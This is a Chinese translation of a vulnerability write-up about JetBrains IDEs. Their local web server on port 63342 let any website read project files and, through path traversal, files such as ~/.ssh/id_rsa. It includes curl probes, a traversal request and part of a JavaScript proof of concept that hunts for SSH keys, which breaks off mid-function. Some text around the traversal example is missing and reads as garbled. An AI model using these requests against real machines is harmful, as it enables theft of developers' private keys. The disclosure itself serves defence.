# JetBrains IDE 远程代码执行和本地文件泄露
|
##### 译文声明
本文是翻译文章，文章来源：saynotolinux
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
至少从2013年开始，一直到2016年5月，JetBrains
IDE就一直存在本地文件泄露问题，windows和osx版本还存在远程代码执行的问题。这种攻击的唯一前提就是受害者要在IDE启用时访问攻击者控制的网页。
受影响的IDE包括 PyCharm、Android Studio、WebStorm和IntelliJ IDEA 等。
我在2013年就对这些问题的核心部分进行过追踪（允许所有来源和长期启用的web服务器）。我相信从那时起，所有带有长期启用服务器的JetBrains
IDE都易受到此类攻击。
影响windows和osx版本的远程代码执行漏洞是在2015年7月13日发现的，但是可能很早之前就已经通过其他手段实现了。
发现的所有问题都已经在2016年5月11日发布的修补程序中得到了解决。
**调查**
**  
**
因为这些问题已经被修复，所以要想要进行调查就需要PyCharm 5.0.4版本，或者是PyCharm 2016.1的旧版本。很明显我们可以在VM中实现。
Linux: 
OS X: 
Windows :
**第一次发现**
**  
**
开始的时候我只是在做协议开发研究工作，也一直在寻找有趣的目标。我想在我自己的设备上运行一些很有趣的服务，于是我运行了lsof -P -ITCP | grep
LISTEN，想要看看有什么程序是被本地TCP端口监控的。
    $ lsof -P -iTCP | grep LISTEN
    # ...
    pycharm   4177 user  289u  IPv4 0x81a02fb90b4eef47      0t0  TCP localhost:63342  (LISTEN)
我当时使用的IDE是PyCharm，但是一直都没有注意到它绑定到任何一个端口。可能是某种特设IPC机制？让我们来找出这些端口都发送了什么内容，遵循的都是什么协议：
    $ nmap -A -p 63342 127.0.0.1
    # [...]
    PORT      STATE SERVICE VERSION
    63342/tcp open  unknown
    1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at http://www.insecure.org/cgi-bin/servicefp-submit.cgi :
    SF-Port63342-TCP:V=6.46%I=7%D=8/2%Time=57A0DD64%P=x86_64-apple-darwin13.1.
    SF:0%r(GetRequest,173,"HTTP/1.1x20404x20Notx20Foundrncontent-type:x
    # [...]
看起来像是一个HTTP服务器，这对于本地应用程序来说很不正常。让我们来看一下响应中用的是什么CORS标头：
    $ curl -v -H "Origin: http://attacker.com/" "http://127.0.0.1:63342/"
    > GET / HTTP/1.1
    > Host: 127.0.0.1:63342
    > User-Agent: curl/7.43.0
    > Accept: */*
    > Origin: http://attacker.com/
    > 
    404 Not Found404 Not FoundPyCharm 5.0.4
这里有一些异常。PyCharm 的 HTTP 服务器的基本意思就是允许 web 页面上任何来源 （包括 http://attacker.com）
提出资质请求，并读取响应。那到底什么是HTTP服务器呢？它是否会含有敏感信息？如果任何页面都能读取它的内容我们该怎么办？  
**什么是HTTP服务器？**
**  
**
在查找网页对应的端口号之后我们发现，服务器和Webstorm在2013年初新添加的新功能有关。功能理念就是用户不需要设置自己的web服务器在浏览器中预览网页，只要在Webstorm中单击“在浏览器中查看”这个按钮就可以在http://localhost:63342//中进行查看。其中包含的任何脚本或者页面都可以通过类似的链接（http://localhost:63342//some_script.js）呈现。
要验证 PyCharm 嵌入的服务器是否与 WebStorm 类似，让我们在 PyCharm创建一个名为"测试"
的项目，并在根目录中创建一个名为"something.txt"的文件。
    $ curl -v -H "Origin: http://attacker.com/" "http://127.0.0.1:63342/testing/something.txt"
    > GET /testing/something.txt HTTP/1.1
    > Host: 127.0.0.1:63342
    > User-Agent: curl/7.43.0
    > Accept: */*
    > Origin: http://attacker.com/
    > 
     GET /testing/..%2f..%2f.ssh/id_rsa HTTP/1.1
    [...]
    > 
    /.idea/workspace.xml。
    $ curl --head "http://localhost:63342/testing/.idea/workspace.xml"
    HTTP/1.1 200 OK
    $ curl --head "http://localhost:63342/somethingelse/.idea/workspace.xml"
    HTTP/1.1 404 Not Found
下面是JavaScript中一个原始的PoC：
    function findLoadedProject(cb) {
      var xhr = new XMLHttpRequest();
      // Let's assume we have a sensible dictionary here.
      var possibleProjectNames = ["foobar", "testing", "bazquux"];
      var tryNextProject = function() {
        if (!possibleProjectNames.length) {
          cb(null);
          return;
        }
        var projectName = possibleProjectNames.pop();
        xhr.open("GET", "http://localhost:63342/" + projectName + "/.idea/workspace.xml", true);
        xhr.onload = function() {
          if(xhr.status === 200) {
            cb(projectName);
          } else {
            tryNextProject();
          }
        };
        xhr.send();
      };
    }
    var findSSHKeys = function(projectName) {
      var xhr = new XMLHttpRequest();
      var depth = 0;
      var tryNextDepth = function() {
        // No luck, SSH directory doesn't share a parent
        // directory with the project.
        if(++depth > 15) {
          return;
        }